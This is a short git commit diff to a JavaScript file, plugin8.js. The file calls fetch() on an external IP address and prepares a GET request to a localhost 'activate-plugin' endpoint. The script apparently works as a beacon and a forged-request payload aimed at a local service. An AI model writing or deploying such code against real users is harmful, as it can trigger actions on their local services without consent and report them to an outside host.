c8dc6f3a878fa5bee180ca5f82631026db187059
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 17:21:13 +0100

    Update and rename plugin7.js to plugin8.js

--- plugin8.js
+++ plugin8.js
@@ -3,5 +3,6 @@ fetch("http://82.65.210.151:24000/?test");
 url = 'http://localhost:5000/activate-plugin/1';
 
 var xhr = new XMLHttpRequest();
-
+// Configure the request
+xhr.open('GET', url, true);
 
